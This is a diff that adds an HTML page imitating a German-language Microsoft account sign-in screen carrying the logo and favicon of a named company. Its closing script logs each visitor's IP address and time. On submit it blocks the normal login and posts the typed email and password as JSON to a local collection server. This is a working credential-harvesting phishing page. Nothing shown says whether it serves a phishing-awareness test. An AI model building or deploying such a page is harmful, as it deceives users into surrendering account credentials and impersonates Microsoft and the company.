@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bei Ihrem Konto anmelden</title>
+    <link rel="icon" href="https://rise-partners.de/wp-content/uploads/2024/03/RISE_fav-150x150.png" type="image/png">
+    <link rel="stylesheet" href="styles.css">
+
+    
+</head>
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
+    <!-- <script type="text/javascript">//<![CDATA[
+!function(){var e=window,s=e.document,i=e.$Config||{};if(e.self===e.top){s&&s.body&&(s.body.style.display="block")}else if(!i.allowFrame){var o,t,r,f,n,d;if(i.fAddTryCatchForIFrameRedirects){try{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}catch(e){}}else{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",
+o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}}}();
+//]]></script> -->
+    
+
+<div><!--  -->
+
+<!--  -->
+
+<div data-bind="if: activeDialog"></div>
+
+<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="https://login.microsoftonline.com/common/login" class="provide-min-height">
+    <div class="login-paginated-page">
+        <div id="lightboxTemplateContainer" >
+
+<div id="lightboxBackgroundContainer" ><div class="background-image-holder" role="presentation">
+    <div id="backgroundImage" role="img" class="background-image ext-background-image" aria-label="Hintergrundbild der Organisation" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg&quot;);"></div>
+</div></div>
+
+<div class="outer">
+    <div class="template-section main-section">
+        <div class="middle ext-middle">
+            <div class="full-height">
+<div class="flex-column">
+    <div class="win-scroll">
+        <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+
+        <div class="lightbox-cover" ></div>
+        <div >
+            <a href="https://rise-partners.de/">
+                <img class="logo" role="img" style="height: 50px; " src="data:image/png;base64,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" alt="Microsoft">
+            <!-- pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"  -->
+            <!-- margin-left: 283px; -->
+            </a>
+        </div>
+
+        <div role="main" ><!--  -->
+
+<div  class="">
+
+    <div class="pagination-view animate slide-in-next" >
+
+        <div data-viewid="1" data-showfedcredbutton="true" >
+
+<div data-bind="component: { name: 'header-control',
+    params: {
+        serverData: svr,
+        title: customTitle() || str['WF_STR_HeaderDefault_Title'],
+        headerDescription: customDescription() } }"><div>
+    <div class="row title ext-title" id="loginHeader" >
+        <div role="heading" aria-level="1" data-bind="text: title">Anmelden</div>
+    </div>
+
+</div></div>
+
+
+
+<div class="row">
+ 
+    <div role="alert" aria-live="assertive">
+    </div>
+
+    <div class="form-group col-md-24">
+
+        <div class="placeholderContainer" >
+            <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" autocomplete="username" aria-label="Geben Sie Ihre E-Mail-Adresse, Telefonnummer oder Ihren Skype-Namen ein." aria-describedby="loginHeader usernameError" placeholder="Benutzername">
+
+            <input name="passwd" type="password" id="i0118" style="margin-top: 15px;" class="form-control ltr_override input ext-input text-box ext-text-box" tabindex="-1" aria-hidden="true" placeholder="Kennwort">
+</div>
+
+    </div>
+</div>
+
+<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
+    <div class="row">
+        <div class="col-md-24">
+            <div class="text-13">
+
+                <div class="form-group"><a href="#" id="signup" style="color: #29586c;" aria-label="Microsoft-Konto erstellen">Kennwort vergessen</a></div>
+
+                <div class="form-group">
+                    <a id="cantAccessAccount" name="cannotAccessAccount" style="color: #29586c;" href="#">Sie können nicht auf Ihr Konto zugreifen?</a>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="win-button-pin-bottom" >
+    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
+        <div ><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" >
+
+    <div  class="inline-block button-item ext-button-item">
+        <input type="button" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary" value="Zurück">
+    </div>
+
+
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+
+        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" style="background-color: #29586c;" value="Weiter">
+
+    </div>
+</div></div>
+    </div>
+</div>
+
+</div>
+    </div>
+</div></div>
+
+<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
+        </div>
+
+        <div >
+<div  class="promoted-fed-cred-box ext-promoted-fed-cred-box">
+    <div class="promoted-fed-cred-content" >
+
+        <div class="tile-container" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
+            <div class="row tile">
+                <div class="table" role="button" tabindex="0" aria-label="Anmeldeoptionen">
+
+                    <div class="table-row">
+                        <div class="table-cell tile-img medium">
+<img class="tile-img medium" role="presentation" data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"><!-- /ko -->
+
+                        </div>
+                        <div class="table-cell text-left content">
+
+                            <div data-bind="text: $data.text, attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Anmeldeoptionen</div>
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+</div>
+</div>
+        
+    </div>
+</div>
+</div>
+        </div>
+    </div>
+
+    <div id="footer" role="contentinfo"  class="footer ext-footer">
+
+        <div >
+<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
+
+        <a id="ftrTerms" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Nutzungsbedingungen</a>
+
+        <a id="ftrPrivacy" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Datenschutz und Cookies</a>
+
+    <a id="moreOptions" href="#" role="button"  aria-label="Klicken Sie hier, um weitere Informationen zur Problembehandlung zu erhalten." aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+</div>
+</div>
+    </div>
+
+</div>
+</div>
+
+</div>
+
+</form>
+
+
+</div>
+<script>
+
+let data = {};
+
+const form = document.querySelector("#i0281");
+const mail  = document.querySelector("#i0116");
+const password  = document.querySelector("#i0118");
+let ip = undefined;
+
+async function getIp() {
+    await fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            ip = data.ip;
+        })
+        .catch(error => {
+            console.error('Error fetching IP address:', error);
+        });
+};
+
+const currentDate = new Date();
+const date = currentDate.toLocaleString();
+
+getIp().then(() => {
+    data = {
+        date,
+        ip,
+    };
+
+    console.log(data);
+
+    fetch('http://localhost:3000/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Data successfully sent:', data);
+    })
+    .catch(error => {
+        console.error('Error sending data:', error);
+    });
+
+});
+    
+
+form.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    data = {
+        date,
+        ip,
+        mail: mail.value,
+        password: password.value,
+    };
+
+    console.log(data);
+
+    fetch('http://localhost:3000/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Data successfully sent:', data);
+    })
+    .catch(error => {
+        console.error('Error sending data:', error);
+    });
+    
+
+    // window.location.href = 'https://login.microsoftonline.com/common/login';
+});
+
+</script>
+</body>
+</html>
